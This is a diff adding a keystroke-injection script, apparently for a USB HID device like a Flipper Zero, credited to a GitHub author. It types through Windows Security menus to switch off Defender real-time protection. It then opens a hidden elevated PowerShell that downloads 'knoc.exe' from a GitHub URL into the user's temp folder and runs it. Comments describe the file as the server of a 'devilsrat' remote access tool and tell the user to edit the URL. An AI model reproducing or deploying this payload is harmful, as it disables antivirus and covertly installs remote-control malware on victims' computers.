@@ -1,0 +1,60 @@
+REM Author      : https://github.com/knoxoxen
+REM Description : Disable Windows Defender on Windows 10
+
+DELAY 1000
+REM Open Windows Defender settings
+CTRL ESC
+DELAY 1000
+STRING Windows security
+DELAY 2000
+ENTER
+REM Navigate to realtime protection and disable it
+DELAY 1000
+TAB
+DELAY 1000
+TAB
+DELAY 1000
+TAB
+DELAY 1000
+TAB
+DELAY 1000
+DOWNARROW
+DELAY 1000
+ENTER
+DELAY 1000
+TAB
+DELAY 1000
+TAB
+DELAY 500
+TAB
+DELAY 500
+TAB
+DELAY 500
+TAB
+DELAY 500
+ENTER
+DELAY 500
+SPACE
+DELAY 500
+TAB
+DELAY 500
+TAB
+DELAY 500
+ENTER
+DELAY 500
+ALT F4
+REM start of script
+REM must make upload of server from devilsrat client included in package then edit url and output file destination in string below
+REM let the HID enumerate
+DELAY 2000
+GUI r
+DELAY 200
+REM my best attempt at a elevated powershell instance
+STRING powershell Start-Process powershell -Verb runAs -w h MD "$ENV:USERPROFILE\TEMP"; IWR "https://github.com/knoxoxen/flipperstuffs/raw/main/Devils-Rat%206.0/knoc.exe"  -OUTFILE "$ENV:USERPROFILE\TEMP\knoc.exe"; CD $ENV:USERPROFILE\TEMP; SLEEP 5; & .\knoc.EXE
+ENTER
+
+
+
+
+
+
